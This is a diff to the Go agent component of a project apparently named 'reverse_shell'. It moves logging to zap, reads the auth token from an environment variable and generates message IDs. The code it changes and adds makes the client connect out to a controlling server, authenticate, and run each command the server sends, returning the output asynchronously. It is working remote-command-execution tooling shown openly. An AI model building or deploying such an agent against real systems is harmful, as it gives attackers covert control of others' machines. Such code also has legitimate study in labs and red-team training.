@@ -1,10 +1,14 @@
 package agent
 
 import (
-	"fmt"
 	"net"
+	"os"
+	"reverse_shell/pkg/common"
 	"reverse_shell/pkg/protocol"
+
 	"runtime"
+
+	"go.uber.org/zap"
 )
 
 type Client struct {
@@ -13,10 +17,11 @@ type Client struct {
 	SessionID string
 	ID        string
 	Done      chan struct{}
+	logger    *zap.Logger
 }
 
-func Run(addr string, caFile, serverName string) (*Client, error) {
-	conn, err := ConnectLoop(addr, caFile, serverName)
+func Run(addr string, caFile, serverName string, logger *zap.Logger) (*Client, error) {
+	conn, err := ConnectLoop(addr, caFile, serverName, logger)
 	if err != nil {
 		return nil, err
 	}
@@ -26,105 +31,109 @@ func Run(addr string, caFile, serverName string) (*Client, error) {
 		Conn:      conn,
 		Codec:     codec,
 		SessionID: "x",
-		ID:        "x",
+		ID:        common.GenerateID(),
 		Done:      make(chan struct{}),
 	}
-	fmt.Println("Client started")
+	logger.Info("Client started")
+
+	authPayload := os.Getenv("AGENT_AUTH_FLAG")
 
 	message := protocol.Message{
 		Type:      protocol.MsgAuth,
-		Payload:   "agent_auth_flag:authenticate_me",
-		ID:        "x",
+		Payload:   authPayload,
+		ID:        common.GenerateID(),
 		SessionID: "x",
 		Meta: map[string]string{
-			"version":  "1.0",
+			"version":  protocol.ProtocolVersion,
 			"platform": runtime.GOOS,
 		},
 	}
 	if err := codec.Send(message); err != nil {
 		return nil, err
 	}
-	fmt.Println("[+] Agent connected")
+	logger.Info("[+] Agent connected")
 
-	go client.readLoop()
+	go client.readLoop(logger)
 
 	return client, nil
 }
 
-func (c *Client) readLoop() {
+func (c *Client) readLoop(logger *zap.Logger) {
+	defer c.Conn.Close()
 	defer close(c.Done)
 	for {
 		msg, err := c.Codec.Read()
 		if err != nil {
-			fmt.Println("Error reading message:", err)
+			logger.Error("Error reading message:", zap.Error(err))
 			c.Conn.Close()
 			return
 		}
-		fmt.Printf("Received message: %s\n", msg.Payload)
-		c.handle(msg)
+		logger.Info("Received message", zap.String("payload", msg.Payload))
+		c.handle(msg, logger)
 	}
 }
 
-func (c *Client) handle(msg protocol.Message) {
+func (c *Client) handle(msg protocol.Message, logger *zap.Logger) {
 	switch msg.Type {
 	case protocol.MsgHello:
-		fmt.Println("[+] Server responded with hello")
-		fmt.Println("[+] Connection established")
+		logger.Info("[+] Server responded with hello")
+		logger.Info("[+] Connection established")
 	case protocol.MsgAuth:
-		fmt.Println("[+] Server requested authentication")
+		logger.Info("[+] Server requested authentication")
 		c.SessionID = msg.SessionID
-		c.ID = msg.ID
-		fmt.Println("[+] Session ID set to:", c.SessionID)
-		fmt.Println("[+] Authentication successful")
+		logger.Info("[+] Session ID set to:", zap.String("session_id", c.SessionID))
+		logger.Info("[+] Authentication successful")
 	case protocol.MsgPing:
-		fmt.Println("[+] Received ping")
+		logger.Info("[+] Received ping")
 		response := protocol.Message{
 			Type:      protocol.MsgPong,
-			ID:        msg.ID,
+			ID:        common.GenerateID(),
 			SessionID: msg.SessionID,
 			Meta: map[string]string{
-				"version":  "1.0",
+				"version":  protocol.ProtocolVersion,
 				"platform": runtime.GOOS,
 			},
 			Payload: "Pong",
 		}
 		if err := c.Codec.Send(response); err != nil {
-			fmt.Println("Error sending response:", err)
+			logger.Error("Error sending response:", zap.Error(err))
 		}
 	case protocol.MsgExec:
-		fmt.Println("[+] Received command:", msg.Payload)
-		output, err := ExecuteCommand(string(msg.Payload))
-		if err != nil {
-			fmt.Println("Error executing command:", err)
-		} else {
-			response := protocol.Message{
-				Type:      protocol.MsgResult,
-				Payload:   output,
-				ID:        msg.ID,
-				SessionID: msg.SessionID,
-				Meta: map[string]string{
-					"version":  "1.0",
-					"platform": runtime.GOOS,
-				},
-			}
-			if err := c.Codec.Send(response); err != nil {
-				fmt.Println("Error sending response:", err)
+		logger.Info("[+] Received command:", zap.String("command", msg.Payload))
+		go func() {
+			output, err := ExecuteCommand(string(msg.Payload))
+			if err != nil {
+				logger.Error("Error executing command:", zap.Error(err))
 				responseErr := protocol.Message{
 					Type:      protocol.MsgError,
 					Payload:   err.Error(),
-					ID:        msg.ID,
+					ID:        common.GenerateID(),
 					SessionID: msg.SessionID,
 					Meta: map[string]string{
-						"version":  "1.0",
+						"version":  protocol.ProtocolVersion,
 						"platform": runtime.GOOS,
 					},
 				}
 				if err := c.Codec.Send(responseErr); err != nil {
-					fmt.Println("Error sending error response:", err)
+					logger.Error("Error sending error response:", zap.Error(err))
+				}
+			} else {
+				response := protocol.Message{
+					Type:      protocol.MsgResult,
+					Payload:   output,
+					ID:        common.GenerateID(),
+					SessionID: msg.SessionID,
+					Meta: map[string]string{
+						"version":  protocol.ProtocolVersion,
+						"platform": runtime.GOOS,
+					},
+				}
+				if err := c.Codec.Send(response); err != nil {
+					logger.Error("Error sending command output:", zap.Error(err))
 				}
 			}
-		}
+		}()
 	default:
-		fmt.Println("[+] Unknown message type:", msg.Type)
+		logger.Info("[+] Unknown message type:", zap.String("type", msg.Type))
 	}
 }
